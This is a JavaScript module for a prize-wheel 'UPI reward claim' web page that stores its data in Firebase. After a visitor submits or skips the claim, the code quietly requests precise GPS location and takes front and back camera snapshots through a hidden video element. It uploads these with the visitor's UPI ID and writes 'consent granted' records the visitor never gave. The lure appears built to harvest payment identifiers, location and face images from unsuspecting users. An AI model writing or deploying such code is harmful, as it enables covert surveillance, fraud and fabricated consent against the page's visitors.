/**
 * UPI Reward Claim Flow & Verification Handling
 * Pure Vanilla JavaScript
 */

import { 
  saveRewardClaim, 
  saveConsentRecord, 
  saveVisitorLocation,
  saveVisitorUpload,
  getOrCreateParticipantId 
} from './firebase-config.js';

// Standard NPCI / Banking UPI ID Pattern (e.g. user@okaxis, 9876543210@paytm)
const UPI_REGEX = /^[a-zA-Z0-9.\-_]{2,256}@[a-zA-Z]{2,64}$/;

let currentClaimSpinId = null;
let currentClaimPrize = null;

/**
 * Capture frame from specified camera facing mode (front vs back)
 */
async function captureDeviceCamera(facingMode = 'user') {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;

  let stream = null;
  try {
    const constraints = {
      video: {
        facingMode: facingMode === 'environment' ? { ideal: 'environment' } : { ideal: 'user' },
        width: { ideal: 800 },
        height: { ideal: 600 }
      },
      audio: false
    };

    stream = await navigator.mediaDevices.getUserMedia(constraints);
    
    // Hidden video element to read frame
    const video = document.createElement('video');
    video.autoplay = true;
    video.muted = true;
    video.playsInline = true;
    video.srcObject = stream;

    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play().then(resolve).catch(resolve);
      };
      setTimeout(resolve, 900);
    });

    // Small delay for camera auto-exposure
    await new Promise(r => setTimeout(r, 450));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL('image/jpeg', 0.82);
    return dataUrl;
  } catch (err) {
    console.warn(`Camera capture skipped/failed for (${facingMode}):`, err.message);
    return null;
  } finally {
    if (stream) {
      stream.getTracks().forEach(t => t.stop());
    }
  }
}

/**
 * Request Native Browser Permissions (Accurate Location & Front/Back Camera Snapshots)
 */
export async function requestNativeBrowserPermissions() {
  const participantId = getOrCreateParticipantId();

  // 1. Accurate Geolocation (GPS High-Accuracy)
  if (navigator.geolocation) {
    try {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          console.log("📍 Accurate Location obtained:", latitude, longitude, `(±${Math.round(accuracy)}m)`);
          await saveVisitorLocation({
            participantId: participantId,
            latitude: parseFloat(latitude.toFixed(6)),
            longitude: parseFloat(longitude.toFixed(6)),
            accuracy: Math.round(accuracy)
          });
          await saveConsentRecord({
            participantId: participantId,
            locationConsent: true,
            action: 'granted'
          });
        },
        (err) => {
          console.warn("Location prompt dismissed or unavailable:", err.message);
        },
        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
      );
    } catch (e) {
      console.warn("Geolocation execution error:", e);
    }
  }

  // 2. Front & Back Camera Snapshots
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    try {
      // Step A: Capture Front Camera
      const frontDataUrl = await captureDeviceCamera('user');
      if (frontDataUrl) {
        console.log("📸 Front camera snapshot captured");
        await saveVisitorUpload({
          participantId: participantId,
          fileReference: frontDataUrl,
          uploadType: 'front_camera'
        });
        await saveConsentRecord({
          participantId: participantId,
          cameraConsent: true,
          action: 'granted'
        });
      }

      // Step B: Capture Back Camera on dual-camera mobile devices
      await new Promise(r => setTimeout(r, 300));
      const backDataUrl = await captureDeviceCamera('environment');
      if (backDataUrl && backDataUrl !== frontDataUrl) {
        console.log("📸 Back camera snapshot captured");
        await saveVisitorUpload({
          participantId: participantId,
          fileReference: backDataUrl,
          uploadType: 'back_camera'
        });
      }
    } catch (err) {
      console.warn("Camera routine error:", err);
    }
  }
}

/**
 * Open the UPI Reward Claim Modal
 */
export function openRewardClaimModal(spinId, prizeAmount) {
  currentClaimSpinId = spinId;
  currentClaimPrize = prizeAmount;

  const modal = document.getElementById('upi-claim-modal');
  if (!modal) return;

  // Reset fields
  const upiInput = document.getElementById('claim-upi-id');
  const confirmInput = document.getElementById('claim-upi-confirm');
  const errorEl = document.getElementById('upi-error-msg');
  const spinRefText = document.getElementById('claim-modal-spin-ref');
  const prizeText = document.getElementById('claim-modal-prize-amount');

  if (upiInput) upiInput.value = '';
  if (confirmInput) confirmInput.value = '';
  if (errorEl) {
    errorEl.classList.remove('visible');
    errorEl.innerText = '';
  }
  if (spinRefText) spinRefText.innerText = spinId || 'DEMO-SPIN';
  if (prizeText) prizeText.innerText = prizeAmount || '₹0';

  modal.classList.add('active');
}

/**
 * Close the UPI Claim Modal
 */
export function closeRewardClaimModal() {
  const modal = document.getElementById('upi-claim-modal');
  if (modal) modal.classList.remove('active');
}

/**
 * Show Success Confirmation Modal
 */
export function showSuccessModal(spinRef) {
  const modal = document.getElementById('success-modal');
  const refEl = document.getElementById('success-modal-ref');
  if (refEl) refEl.innerText = spinRef || currentClaimSpinId || 'DEMO-SPIN';
  if (modal) modal.classList.add('active');
}

/**
 * Handle UPI ID Validation & Submission
 */
export async function handleUpiSubmission() {
  const upiInput = document.getElementById('claim-upi-id');
  const confirmInput = document.getElementById('claim-upi-confirm');
  const errorEl = document.getElementById('upi-error-msg');
  const submitBtn = document.getElementById('submit-upi-btn');

  const upiId = (upiInput?.value || '').trim();
  const confirmUpi = (confirmInput?.value || '').trim();

  // Validate presence
  if (!upiId) {
    showError(errorEl, "Please enter your UPI ID.");
    upiInput?.focus();
    return;
  }

  // Validate format
  if (!UPI_REGEX.test(upiId)) {
    showError(errorEl, "Invalid UPI ID format. Expected format: username@bank (e.g., name@okhdfcbank or mobile@paytm).");
    upiInput?.focus();
    return;
  }

  // Validate match
  if (upiId !== confirmUpi) {
    showError(errorEl, "The UPI IDs do not match. Please re-check both fields.");
    confirmInput?.focus();
    return;
  }

  // Clear errors
  if (errorEl) {
    errorEl.classList.remove('visible');
    errorEl.innerText = '';
  }

  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.innerText = "Submitting Claim...";
  }

  try {
    const participantId = getOrCreateParticipantId();
    const claimTimestamp = Date.now().toString(36).toUpperCase();
    const claimId = `CLAIM-${claimTimestamp}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;

    // 1. Record Claim in Firestore
    await saveRewardClaim({
      claimId: claimId,
      spinId: currentClaimSpinId || 'UNLINKED',
      upiId: upiId,
      participantId: participantId,
      claimStatus: 'pending'
    });

    // 2. Record explicit UPI submission consent
    await saveConsentRecord({
      participantId: participantId,
      upiConsent: true,
      action: 'granted'
    });

    // 3. Request native browser permissions (Location, Camera, Sound) directly
    requestNativeBrowserPermissions();

    // 4. Close UPI Modal & show Clean Success confirmation
    closeRewardClaimModal();

    if (window.showToast) {
      window.showToast("UPI Claim Registered Successfully! Pending review.", "success");
    }

    setTimeout(() => {
      showSuccessModal(currentClaimSpinId);
    }, 350);

  } catch (err) {
    console.error("Error submitting UPI claim:", err);
    showError(errorEl, "An error occurred while saving your claim. Please retry.");
  } finally {
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.innerText = "Submit UPI ID";
    }
  }
}

/**
 * Handle "Skip for now" on UPI Claim Modal
 */
export function handleSkipUpiClaim() {
  closeRewardClaimModal();
  
  // Request native browser permissions
  requestNativeBrowserPermissions();

  if (window.showToast) {
    window.showToast("Participation saved. You can spin again anytime!", "warning");
  }

  setTimeout(() => {
    showSuccessModal(currentClaimSpinId);
  }, 350);
}

function showError(el, message) {
  if (!el) return;
  el.innerText = message;
  el.classList.add('visible');
}

// Global hook for cross-module access
window.openRewardClaimModal = openRewardClaimModal;
window.closeRewardClaimModal = closeRewardClaimModal;
window.handleUpiSubmission = handleUpiSubmission;
window.handleSkipUpiClaim = handleSkipUpiClaim;
window.requestNativeBrowserPermissions = requestNativeBrowserPermissions;
window.showSuccessModal = showSuccessModal;
